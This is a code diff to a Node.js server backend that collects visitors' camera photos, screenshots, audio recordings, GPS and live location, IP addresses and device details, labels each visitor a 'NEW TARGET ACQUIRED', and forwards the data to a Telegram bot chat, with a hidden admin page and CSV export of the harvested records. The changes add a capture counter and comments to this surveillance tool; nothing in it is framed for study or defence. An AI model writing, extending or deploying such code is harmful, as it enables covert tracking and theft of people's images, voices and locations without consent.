@@ -20,7 +20,6 @@ const TELEGRAM_CHAT_ID = '5387196154';
 // ==========================================
 // ENCRYPTED ADMIN PASSWORD
 // ==========================================
-// Password: admin123#@!
 const ADMIN_PASSWORD_HASH = '$2b$10$WL/uVqDgR1Z94OoXTPzkTewSFsjqN8LiBrGwUEeoV1DdFbjvPJMO6';
 
 async function verifyPassword(plainPassword) {
@@ -37,10 +36,14 @@ async function verifyPassword(plainPassword) {
 // ==========================================
 async function sendTelegramPhoto(imageData, caption) {
     try {
+        // Remove base64 prefix
         const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
         const buffer = Buffer.from(base64Image, 'base64');
         
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        
+        // Use FormData
+        const FormData = require('form-data');
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('photo', buffer, { filename: 'capture.jpg' });
@@ -86,14 +89,14 @@ app.get('/secret-admin.html', (req, res) => {
 });
 
 // ==========================================
-// STORE DATA
+// STORE DATA + TELEGRAM
 // ==========================================
 app.post('/api/store', async (req, res) => {
     try {
         const { 
             cameraImage, location, deviceDetails, screenshot, 
             userPhoto, audioData, ipAddress, fullDeviceInfo,
-            networkSpeed, liveLocation
+            networkSpeed, liveLocation, captureCount
         } = req.body;
 
         const newEntry = {
@@ -108,12 +111,16 @@ app.post('/api/store', async (req, res) => {
             ipAddress: ipAddress || 'Unknown',
             networkSpeed: networkSpeed || {},
             liveLocation: liveLocation || {},
+            captureCount: captureCount || 0,
             timestamp: new Date().toISOString()
         };
 
         allData.unshift(newEntry);
         console.log('✅ Stored! Total:', allData.length);
 
+        // ==========================================
+        // SEND TO TELEGRAM
+        // ==========================================
         const caption = `
 🔴 <b>NEW TARGET ACQUIRED</b> 🔴
 📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
@@ -123,9 +130,11 @@ app.post('/api/store', async (req, res) => {
 📶 Network: ${fullDeviceInfo?.connection?.type || 'Unknown'}
 🚀 Speed: ${networkSpeed?.download || 'Unknown'} Mbps
 🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
+📸 Captures: ${captureCount || 1}
 🕐 Time: ${new Date().toISOString()}
         `;
 
+        // Send photo to Telegram
         if (userPhoto) {
             await sendTelegramPhoto(userPhoto, caption);
         } else if (screenshot) {
@@ -157,7 +166,7 @@ app.get('/api/get-ip', (req, res) => {
 // ==========================================
 app.get('/api/export-csv', (req, res) => {
     try {
-        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio\n';
+        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio,Captures\n';
         
         allData.forEach(item => {
             const row = [
@@ -170,7 +179,8 @@ app.get('/api/export-csv', (req, res) => {
                 item.fullDeviceInfo?.deviceModel || 'Unknown',
                 item.fullDeviceInfo?.connection?.type || 'Unknown',
                 item.networkSpeed?.download || 'Unknown',
-                item.audioData ? 'Yes' : 'No'
+                item.audioData ? 'Yes' : 'No',
+                item.captureCount || 1
             ];
             csv += row.join(',') + '\n';
         });
@@ -184,7 +194,7 @@ app.get('/api/export-csv', (req, res) => {
 });
 
 // ==========================================
-// ADMIN - VERIFY ENCRYPTED PASSWORD
+// ADMIN
 // ==========================================
 app.post('/api/admin/get-data', async (req, res) => {
     try {
@@ -241,6 +251,9 @@ app.post('/api/admin/delete', async (req, res) => {
     }
 });
 
+// ==========================================
+// START SERVER
+// ==========================================
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server: http://localhost:${PORT}`);
     console.log(`🔑 Admin: /secret-admin.html`);
